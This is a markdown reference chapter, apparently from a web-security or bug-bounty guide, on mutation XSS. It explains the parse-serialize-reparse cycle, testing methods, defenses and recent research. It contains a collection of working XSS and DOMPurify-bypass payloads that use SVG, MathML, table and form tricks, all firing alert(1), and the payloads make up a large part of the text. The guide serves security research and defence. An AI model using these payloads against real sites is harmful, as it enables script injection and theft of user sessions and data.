# 43 - Mutation XSS (mXSS) Deep Dive

## What Is Mutation XSS?

Mutation XSS (mXSS) occurs when benign HTML is parsed and then re-serialized by the browser's
DOM engine, producing malicious HTML in the process. The key insight: the browser's parser
**mutates** safe markup into unsafe markup during the parse-serialize-reparse cycle.

This bypasses every server-side sanitizer because the input IS safe HTML. The mutation happens
entirely client-side, inside the browser's rendering engine.

## The Parse-Serialize-Reparse Cycle

1. Server sanitizes input and marks it safe
2. Safe HTML is assigned via innerHTML (first parse)
3. Browser normalizes the DOM (mutations occur here)
4. If the DOM is re-serialized (e.g., innerHTML read, copying)
5. Re-serialized HTML may now contain active content

## Core mXSS Vectors

### 1. Namespace Confusion (SVG/MathML)

The HTML parser switches namespaces when entering svg or math elements.
Elements are parsed differently in foreign content vs HTML context.

```html
<!-- Input (looks safe to sanitizers) -->
<svg><style><img src=x onerror=alert(1)></style></svg>

<!-- What happens:
     1. Parser enters SVG namespace for style
     2. In SVG, style is treated as text content
     3. When re-serialized back to HTML context, the img tag becomes active
-->
```

**DOMPurify bypass (2019, CVE-2019-16728):**
```html
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
```

**MathML namespace confusion:**
```html
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">
```

### 2. Backtick Attribute Mutation (IE/legacy)

```html
<img src=`x`onerror=alert(1)>
```

### 3. Null Byte Injection

```html
<!-- Null bytes can cause parser desync -->
<img src=x\x00onerror=alert(1)>
```

## Modern mXSS Techniques (2024-2026)

### Custom Element Mutation

```html
<custom-tag><template><img src=x onerror=alert(1)></template></custom-tag>
```

### Declarative Shadow DOM mXSS

```html
<div>
  <template shadowrootmode="open">
    <img src=x onerror=alert(1)>
  </template>
</div>
```

### Sanitizer API Bypass Patterns

```html
<div data-x="&#x3C;img src=x onerror=alert(1)&#x3E;"></div>
```

### Trusted Types + mXSS

Even with Trusted Types, mXSS can occur if:
1. A Trusted Type policy creates "safe" HTML
2. That HTML mutates during DOM parsing
3. The mutated HTML contains active content

## Testing Methodology

### Step 1: Identify Reparse Points

Look for code patterns where HTML is:
- Read from innerHTML and written back
- Copied between DOM elements
- Serialized via XMLSerializer
- Processed by createRange().createContextualFragment()
- Used with DOMParser then inserted

### Step 2: Namespace Boundary Testing

```html
<!-- Test SVG namespace transitions -->
<svg><foreignObject><div><style></style></div></foreignObject></svg>
<svg><desc><table><thead></thead></table></desc></svg>
<math><mtext><table><tbody></tbody></table></mtext></math>

<!-- Test integration point confusion -->
<svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg>
```

### Step 3: Parser Differential Testing

Different contexts parse HTML differently. Test with:

```html
<!-- Context: innerHTML of div -->
<div id="target"></div>
<script>target.innerHTML = PAYLOAD;</script>

<!-- Context: innerHTML of table -->
<table id="target"></table>

<!-- Context: innerHTML of select -->
<select id="target"></select>

<!-- Context: innerHTML of SVG foreignObject -->
<svg><foreignObject id="target"></foreignObject></svg>
```

### Step 4: Sanitizer Differential Analysis

```javascript
// Compare sanitizer output with browser DOM serialization
const input = '<svg><style><img src=x onerror=alert(1)>';
const sanitized = DOMPurify.sanitize(input);

// Parse and re-serialize
const div = document.createElement('div');
div.innerHTML = sanitized;
const reserialized = div.innerHTML;

// Compare: if sanitized !== reserialized, mutation occurred
```

## mXSS Payload Collection

### Namespace Confusion Payloads

```html
<svg><style><img src=x onerror=alert(1)></style></svg>
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
<math><mtext><table><mglyph><style><!--</style><img src=1 onerror=alert(1)>--></style>
<svg><style><!--</style><img src=x onerror=alert(1)>-->
<math><mtext><img src=x onerror=alert(1)></mtext></math>
<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>
<svg><desc><img src=x onerror=alert(1)></desc></svg>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

### Table Context Mutation

```html
<table><colgroup><col style="background:url(javascript:alert(1))">
<table><tr><td><style></style><img src=x onerror=alert(1)></td></tr></table>
```

### Form Element Mutations

```html
<form><math><mtext></form><form><mglyph><svg><mtext><style><img src=x onerror=alert(1)>
<form><button formaction=javascript:alert(1)>CLICK</button></form>
```

### noscript Context Mutation

```html
<noscript><img src=x onerror=alert(1)></noscript>
<!-- In scripting-enabled context, noscript content is raw text -->
```

## Defenses and Their Limitations

| Defense | Effective Against mXSS? | Notes |
|---------|------------------------|-------|
| Server-side sanitization | NO | mXSS happens after sanitization |
| DOMPurify (latest) | MOSTLY | Actively patches mXSS vectors |
| Trusted Types | PARTIAL | Depends on policy implementation |
| CSP | YES (mitigates impact) | Prevents inline script invocation |
| Content-Type: text/plain | YES | No HTML parsing at all |
| Sanitizer API (native) | MOSTLY | Browser-native, fewer gaps |

## Bug Bounty Tips

1. **Target rich-text editors** -- they all use innerHTML and are prime mXSS targets
2. **Test email clients** -- HTML email rendering involves parse-serialize cycles
3. **Look for innerHTML read-write patterns** in JavaScript
4. **Test embedded content** -- iframes, embedded documents, shadow DOM
5. **Report mXSS as separate from reflected/stored XSS** -- distinct vuln class
6. **Always test with latest DOMPurify** -- bypasses = DOMPurify CVE (separate bounty)
7. **Monitor DOMPurify issues** -- past bypasses inform future research
8. **SVG + style + math** is the trifecta for modern mXSS
9. **Declarative shadow DOM** is an emerging mXSS attack surface
10. **Test all the sanitizer-innerHTML-reserialize code paths** you can find

---
## [2024-2026 Research Update]

### Chrome 138 HTML Spec Serialization Change (May 2025)

The most impactful structural mitigation against mXSS in years. The HTML specification was updated on May 20, 2025 to escape `<` and `>` in attribute values during serialization (innerHTML, outerHTML, getHTML()). Authored by Michal Bentkowski.

**Browser adoption:**
- Chrome 138 (stable June 24, 2025)
- Firefox 140
- Safari 26 beta

This change directly eliminates the entire class of mXSS where unescaped angle brackets in attribute values produce different parse trees on reparse. Parsing behavior is unchanged -- only serialization output changes.

**What it mitigates:**
```html
<!-- BEFORE Chrome 138: attribute values with < > were serialized literally -->
<!-- This meant reparsing could create new elements from attribute contents -->
<div title="</div><img src=x onerror=alert(1)>">
<!-- After serialize-reparse, the </div> in the attribute could close the div -->

<!-- AFTER Chrome 138: < and > are escaped to &lt; and &gt; in serialization -->
<!-- The reparsed output preserves the attribute boundary -->
```

**What it does NOT mitigate:**
- Namespace confusion (SVG/MathML/HTML switching)
- Depth-limit flattening attacks
- Foster-parenting attacks
- Integration-point re-entry attacks

**Breakage considerations:** Serialized-HTML comparisons (CI tests matching exact HTML strings) may break. Code parsing outerHTML with regex may break. The window between spec change and full browser adoption creates a period where applications relying on the new behavior are not universally protected.

**Source**: [Chrome Developer Blog: Escape Attributes](https://developer.chrome.com/blog/escape-attributes)

### MutaGen Tool (2024)

A generator for hard-to-parse HTML fragments developed by David Klein et al. (TU Braunschweig, Martin Johns's group). Presented at Black Hat Europe 2024 and RuhrSec.

**Capabilities:**
- Generates fragments that exercise parser edge cases: namespace transitions, error recovery, rawtext boundaries, nesting limits
- Checks whether sanitized output produces a different DOM tree on reparse
- Tested 11 sanitizers across five programming languages
- Automatically bypassed all but two of the 11 tested sanitizers

**Approach:**
1. Generate hard-to-parse HTML fragments targeting known parser edge cases
2. Pass them through the target sanitizer
3. Compare sanitizer output DOM tree against browser reparse DOM tree
4. Flag any divergence as a potential mXSS vector

**Source**: [CASA RUB Publication](https://casa.rub.de/forschung/publikationen/detail/parse-me-baby-one-more-time-bypassing-html-sanitizer-via-parsing-differentials), [RuhrSec Slides](https://ruhrsec.de/downloads/slides/Parse-Me-Baby-One-More-Time-Bypassing-HTML-Sanitizer-via-Parsing-Differentials-David-Klein-RuhrSec.pdf)

**Related tool - Robert-Doe/mutagen (GitHub):** An educational/research tool demonstrating the parse-serialize-reparse differential, described as "Mutation XSS built from scratch: why parse(serialize(parse(x))) != parse(x), and how sanitizers get bypassed on re-parse."

**Source**: [GitHub: Robert-Doe/mutagen](https://github.com/Robert-Doe/mutagen)

### Namespace Confusion - Updated Techniques

Namespace confusion remains the most potent and frequently exploited mXSS class. Key 2024-2026 developments:

**SVG namespace style breakout (foundational, still exploitable):**
```html
<!-- In HTML, <style> content is raw text (not parsed as HTML) -->
<!-- In SVG namespace, <style> content IS parsed as elements -->
<svg><p><style><img src=x onerror=alert(1)></style></p></svg>
```

**MathML integration-point re-entry:**
```html
<!-- MathML elements mi, mo, mn, ms, mtext, annotation-xml are "integration points" -->
<!-- that switch parsing back to HTML rules -->
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<!-- mglyph parent switches from HTML form context to MathML mtext context -->
```

**SVG foreignObject re-entry:**
```html
<svg><foreignObject><xmp><img src=x onerror=alert(1)></xmp></foreignObject></svg>
<!-- foreignObject is an HTML integration point inside SVG context -->
<!-- xmp is treated as raw text in HTML but not in SVG -->
```

**MathML xlink:href data URI:**
```html
<math><mi xlink:href="data:x,<script>alert(1)</script>"></mi></math>
<!-- Exploitable when ALLOW_UNKNOWN_PROTOCOLS is enabled -->
```

**Angular namespaced script bypass (GHSA-f3m7-gqxr-g87x):**
Angular's template preparser did not recognize `svg:script` as a script element.

**Ammonia (Rust) namespace bypass (GHSA-mm7x-qfjj-5g2c):**
Elements violating namespace rules were kept rather than removed, enabling XSS through namespace-switched elements.

**lxml_html_clean namespace gap (CVE-2024-52595):**
The lxml-based cleaner does not support SVG or MathML namespaces, so foreign-content elements are not properly handled.

### New Browser Features Creating mXSS Attack Surface

**selectedcontent element (Chrome 130+, 2026):**
A new HTML element that causes the browser to re-clone option content after the sanitizer's walk. DOMPurify 3.4.4 had a default allowlist misconfiguration that let selectedcontent through, enabling XSS (CVE-2026-47423). Fixed in 3.4.5.

```html
<select><button><selectedcontent></selectedcontent></button><option selected=javascript:1><img src=x onerror=alert(1)>x</option></select>
```

**Declarative partial updates (Chrome 150, 2026):**
Template elements with a `for` attribute can patch named markers in the DOM. DOMPurify's defense removes the `for` attribute.

```html
<svg><?marker name="x"></svg><template for="x"><style><img src onerror=alert()></style></template>
```

### DOMPurify's Verification Approach

DOMPurify's wiki states that "closed" attack classes are verified using jsdom, but acknowledges that jsdom does not reproduce several browser-parser classes. The authoritative verification uses a Playwright browser matrix testing across Chrome, Firefox, and Safari.

**Key limitation:** DOMPurify's reliance on jsdom for initial verification, despite jsdom's known parser differences from real browsers, means the project's own testing may miss browser-specific bypasses.

### jsdom vs Browser Parser Divergence

Server-side sanitization via jsdom has fundamentally different behavior:
- **noscript**: jsdom always treats it as raw text; browsers depend on scripting context
- **form element clobbering**: may not apply in jsdom
- **depth limits**: differ between jsdom and browsers
- A payload safe in jsdom may be unsafe in a browser and vice versa

### Updated References

- [Chrome Developer Blog - Escape Attributes](https://developer.chrome.com/blog/escape-attributes)
- [CASA RUB - Parse Me Baby One More Time](https://casa.rub.de/forschung/publikationen/detail/parse-me-baby-one-more-time-bypassing-html-sanitizer-via-parsing-differentials)
- [DOMPurify Wiki - Attack Classes & Bypass History](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History)
- [GitHub: Robert-Doe/mutagen](https://github.com/Robert-Doe/mutagen)
